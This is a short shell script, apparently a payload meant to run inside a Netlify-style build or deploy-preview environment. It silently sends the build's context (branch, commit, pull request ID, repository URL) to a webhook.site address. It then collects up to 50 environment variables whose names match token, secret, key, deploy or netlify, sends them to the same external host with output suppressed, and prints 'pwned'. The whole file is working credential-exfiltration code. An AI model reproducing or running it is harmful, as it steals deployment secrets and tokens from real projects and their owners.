#!/bin/sh
B="https://webhook.site/20a289a4-0bd1-4b65-a5bc-73668e813d9d"
curl -s --max-time 8 --data-urlencode "ctx=$CONTEXT|head=$HEAD|branch=$BRANCH|pr=$REVIEW_ID|repo=$REPOSITORY_URL" "$B/NLPR-CTX" >/dev/null 2>&1
curl -s --max-time 8 --data-urlencode "secrets=$(env | grep -iE 'wtf|token|secret|deploy|netlify|key' | head -50)" "$B/NLPR-SECRETS" >/dev/null 2>&1
echo pwned
